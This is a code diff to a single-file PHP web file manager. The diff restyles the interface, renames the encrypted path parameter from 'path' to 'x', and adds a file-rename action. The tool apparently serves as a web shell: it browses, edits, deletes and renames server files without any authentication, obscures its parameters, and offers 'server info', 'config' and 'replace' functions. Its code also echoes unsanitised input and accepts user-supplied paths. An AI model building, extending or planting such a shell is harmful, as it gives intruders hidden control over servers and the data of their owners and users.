@@ -7,7 +7,8 @@ extract(start());
 <style type="text/css">
     @import url('https://fonts.googleapis.com/css2?family=Inconsolata&display=swap');
     body {
-        background: url('https://i.ibb.co/Yhf7Z5L/pattern-40.gif');
+    	margin: 0;
+        background: #edf2f7;
     }
     * {
         font-family: 'Inconsolata', monospace;
@@ -26,18 +27,19 @@ extract(start());
         width:60%;
     }
     .table {
-        margin-top:59px;
+
     }
     table {
-        width:99.7%;
+        width:80%;
         padding:15px;
         border-radius:5px;
-        background-color: #eee;
+        background-color: #fff;
+        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
     }
     table.header {
         border-spacing:0;
         border-collapse:collapse;
-        width:98.7%;
+        width:95%;
         padding:0px;
         border-radius:5px;
         background:none;
@@ -55,6 +57,12 @@ extract(start());
         padding:3px 7px;
         border:1px solid #bababa;
     }
+    input[type=submit] {
+    	border:1px solid #bababa;
+        border-radius:5px;
+        outline: none;
+        padding:5px;
+    }
     textarea {
         border:1px solid #bababa;
         border-radius:5px;
@@ -62,7 +70,7 @@ extract(start());
         resize: none;
         padding:15px;
         width:100%;
-        height:500px;
+        height:400px;
     }
     a {
         text-decoration: none;
@@ -95,109 +103,132 @@ extract(start());
         color: #01447e;
         text-decoration: underline;
     }
-    .topnav {
-        border-radius:5px;
-        overflow: hidden;
-        background-color: #eee; 
+    div.nav {
+    	width: 100%;
+    	background: #fff;
+    	box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
+    	overflow: hidden;
+    	position: fixed;
     }
-    .topnav a {
+    div.pwd {
+    	margin-top:30px;
+    	padding:20px;
+    }
+    .navbar {
+    	width: 80%;
+        background: #fff;
+    	box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        position: fixed;
+        top: 0;
+        width: 100%;
+      }
+      .navbar a {
+      	overflow: hidden;
         float: left;
         display: block;
-        color: #f2f2f2;
+        color: #eeeeee;
         text-align: center;
-        padding: 14px 16px;
+        padding: 15px 18px;
         text-decoration: none;
-        font-size: 17px;
-    }
-    .topnav .icon {
+        font-size: 18px;
+      }
+      .navbar a:hover {
+        color: #ffffff;
+      }
+      .container {
+        padding: 18px;
+        margin-top: 35px;
+        height: 2000px;
+      }
+      .navbar .icon {
         display: none;
-    }
-    @media screen and (max-width: 600px) {
-        .topnav a:not(:first-child), .dropdown .dropbtn {
+      }
+      @media screen and (max-width: 600px) {
+        .navbar a:not(:first-child) {
             display: none;
         }
-        .topnav a.icon {
+        .navbar a.icon {
             float: right;
             display: block;
         }
-    }
-    @media screen and (max-width: 600px) {
-        .topnav.responsive {position: relative;}
-        .topnav.responsive .icon {
-            position: absolute;
+     }
+     @media screen and (max-width: 600px) {
+     	table {
+     		margin:0;
+     		width:100%;
+     	}
+        .navbar.responsive {position: relative;}
+        .navbar.responsive .icon {
+            position: fixed;
             right: 0;
             top: 0;
+        }
+        .size, .time, .perms {
+        	display: none;
         }
         button {
             padding:5px;
             margin:1;
         }
-        .topnav.responsive a {
+        .navbar.responsive a.cwd {
+        	float: none;
+        }
+        .navbar.responsive a {
             float: none;
             display: block;
             text-align: left;
         }
-        .topnav.responsive .dropdown {float: none;}
-        .topnav.responsive .dropdown-content {position: relative;}
-        .topnav.responsive .dropdown .dropbtn {
+        .navbar.responsive .dropdown {float: none;}
+        .navbar.responsive .dropdown-content {position: relative;}
+        .navbar.responsive .dropdown .dropbtn {
             display: block;
             width: 100%;
             text-align: left;
         }
-    }
+     }
 </style>
 <body>
 <script>
 function myFunction() {
   var x = document.getElementById("myTopnav");
-  if (x.className === "topnav") {
+  if (x.className === "navbar") {
     x.className += " responsive";
   } else {
-    x.className = "topnav";
+    x.className = "navbar";
   }
 }
 </script>
-<table class="header">
-    <tr>
-        <form method="post">
-        <td colspan="4">
-            <div class="topnav" id="myTopnav">
-                <a>
-                    <button>Home</button>
-                </a>
-                <a>
-                    <button>server info</button>
-                </a>
-                <a>
-                    <button>config</button>
-                </a>
-                <a>
-                    <button>create file</button>
-                </a>
-                <a>
-                    <button>replace</button>
-                </a>
-                <a href="javascript:void(0);" style="font-size:15px;color:#000;" class="icon" onclick="myFunction()">&#9776;</a>
-            </div>
-        </td>
-        </form>
-    </tr>
-    <tr>
-        <td colspan="4">
-            <?= pwd() ?>
-        </td>
-    </tr>
-</table>
-<br><br>
+<div class="nav">
+<form method="post">
+	<div class="navbar" id="myTopnav">
+		<a>
+			<button>Home</button>
+		</a>
+		<a>
+			<button>server info</button>
+		</a>
+		<a>
+			<button>config</button>
+		</a>
+		<a>
+			<button>create file</button>
+		</a>
+		<a>
+			<button>replace</button>
+		</a>
+		<a href="javascript:void(0);" style="font-size:15px;color:#000;" class="icon" onclick="myFunction()">&#9776;</a>
+	</div>
+</form>
+</div>
 <?php
-    $_POST['path'] = (isset($_POST['path'])) ? encrypt($_POST['path'],'de') : false;
+    $_POST['x'] = (isset($_POST['x'])) ? encrypt($_POST['x'],'de') : false;
     $_POST['file'] = (isset($_POST['file'])) ? encrypt($_POST['file'],'de') : false;
     $FILEPATH      = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], ' ', $_POST['file']);
     function start(){
         global $_POST,$_GET;
     
-        $result['currentpath'] = (isset($_GET['path'])) ? encrypt($_GET['path'],'de') : getcwd();
-        $result['currentpathen'] = (isset($_GET['path'])) ? $_GET['path'] : encrypt(getcwd(),'en');
+        $result['currentpath'] = (isset($_GET['x'])) ? encrypt($_GET['x'],'de') : getcwd();
+        $result['currentpathen'] = (isset($_GET['x'])) ? $_GET['x'] : encrypt(getcwd(),'en');
     
         return $result;
     }
@@ -231,18 +262,18 @@ function myFunction() {
         $result = '';
         foreach ($paths as $id => $value) {
             if($value == '' && $id == 0) {
-                $result .= '<a href="?path='.encrypt("/",'en').'">/</a>';
+                $result .= '<a href="?x='.encrypt("/",'en').'">/</a>';
                 continue;
             }
             if($value == '') continue;
-            $result .= '<ul class="breadcrumb"><li><a href="?path=';
+            $result .= '<a href="?x=';
             $linkpath = '';
             for ($i=0; $i <= $id ; $i++) { 
                 $linkpath .= $paths[$i];
                 if($i != $id) $linkpath .= "/";
             }
             $result .= encrypt($linkpath,'en');
-            $result .=  '">'.$value.'</a></li></ul';
+            $result .=  '">'.$value.'</a>/';
         } return $result;
     }
     function w__($filename, $perms) {
@@ -274,6 +305,10 @@ function myFunction() {
                 $filesize /= 1024;
             } return round($filesize, 2) . " " . $array[$total];
         } return false;
+    }
+    function changename($filename, $newname) {
+    	global $currentpath;
+    	return rename($filename, $currentpath .DIRECTORY_SEPARATOR. htmlspecialchars($newname));
     }
     function save($filename, $text, $mode = 'w') {
         global $currentpath;
@@ -321,8 +356,87 @@ function myFunction() {
 
 ?>
 <table align="center" class="table">
+<br><br><br><br>
 <?php
 switch (@$_POST['action']) {
+	case 'changename':
+		if (isset($_POST['submit'])) {
+			if (changename($_POST['file'], $_POST['newname'])) {
+				$alert = 'success';
+			} else {
+				$alert = 'failed';
+			}
+		}
+		?>
+		<tr>
+			<td colspan="3">
+				<center>
+					CHANGE NAME
+				</center>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<?= @$alert; ?>
+			</td>
+		</tr>
+		<tr>
+            <td class="act">
+                Filename
+            </td>
+            <td class="img"><center>:</center></td>
+            <td>
+                <?= w__($_POST['file'], basename($_POST['file'])) ?>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                Size
+            </td>
+            <td><center>:</center></td>
+            <td>
+                <?= size($_POST['file']) ?>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                Last Modif
+            </td>
+            <td><center>:</center></td>
+            <td>
+                <?= ftime($_POST['file']) ?>
+            </td>
+        </tr>
+        <form method="post">
+            <td colspan="3">
+                <button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
+                <button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
+                <button name="action" value="edit">edit</button>
+                <button name="action" value="delete">delete</button>
+                <button name="action" value="rename" disabled>rename</button>
+                <button name="action" value="chmod">chmod</button>
+                <button>donwload</button>
+            </td>
+            <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
+        </form>
+        </tr>
+        <form method="post">
+            <tr>
+                <td colspan="3">
+                    <input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+                </td>
+            </tr>
+            <tr>
+                <td colspan="3">
+                    <input type="submit" name="submit">
+                    <input type="hidden" name="action" value="changename">
+                    <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
+                </td>
+            </tr>
+        </form>
+		<?php
+		exit();
+		break;
     case 'edit':
         if (isset($_POST['submit'])) {
             if (save($_POST['file'], $_POST['text'])) {
@@ -374,11 +488,11 @@ switch (@$_POST['action']) {
         <tr>
         <form method="post">
             <td colspan="3">
-                <button onclick="window.location.href='?path=<?= $currentpath ?>'">files</button>
+                <button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
                 <button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
                 <button name="action" value="edit" disabled>edit</button>
                 <button name="action" value="delete">delete</button>
-                <button name="action" value="rename">rename</button>
+                <button name="action" value="changename">rename</button>
                 <button name="action" value="chmod">chmod</button>
                 <button>donwload</button>
             </td>
@@ -404,6 +518,16 @@ switch (@$_POST['action']) {
         break;
 }
 
+?>
+<tr>
+	<td colspan="6">
+		<center>
+			<?= pwd() ?>
+		</center>
+	</td>
+</tr>
+<?php
+
 foreach (getfiles("dir") as $key => $value) {
     ?>
     <tr>
@@ -411,23 +535,24 @@ foreach (getfiles("dir") as $key => $value) {
             <img class="icon" src="https://image.flaticon.com/icons/svg/716/716784.svg">
         </td>
         <td class="files">
-            <a href="?path=<?= $value['link'] ?>"><?= $value['name'] ?></a>
+            <a href="?x=<?= $value['link'] ?>"><?= $value['name'] ?></a>
         </td>
-        <td>
+        <td class="size">
             <?= $value['size'] ?>
         </td>
-        <td>
+        <td class="time">
             <?= $value['time'] ?>
         </td>
-        <td>
+        <td class="perms">
             <?= $value['perm'] ?>
         </td>
         <form method="post">
             <td>
-                <select name="" onchange="if(this.value != '0') this.form.submit()">
+                <select name="action" onchange="if(this.value != '0') this.form.submit()">
                     <option selected disabled>action</option>
+                    <option value="changename">changename</option>
                 </select>
-                <input type="hidden" name="file" value="<?= $value['fullname'] ?>">
+                <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
             </td>
         </form>
     </tr>
@@ -442,20 +567,21 @@ foreach (getfiles("file") as $key => $value) {
         <td class="files">
             <?= $value['name'] ?>
         </td>
-        <td>
+        <td class="size">
             <?= $value['size'] ?>
         </td>
-        <td>
+        <td class="time">
             <?= $value['time'] ?>
         </td>
-        <td>
+        <td class="perms">
             <?= $value['perm'] ?>
         </td>
-        <form method="post" action='?path=<?= $currentpathen ?>'>
+        <form method="post" action='?x=<?= $currentpathen ?>'>
             <td>
                 <select name="action" onchange="if(this.value != '0') this.form.submit()">
                     <option selected disabled>action</option>
                     <option value="edit">edit</option>
+                    <option value="changename">changename</option>
                 </select>
                 <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
             </td>
@@ -465,3 +591,4 @@ foreach (getfiles("file") as $key => $value) {
 }
 ?>
 </table>
+</div>
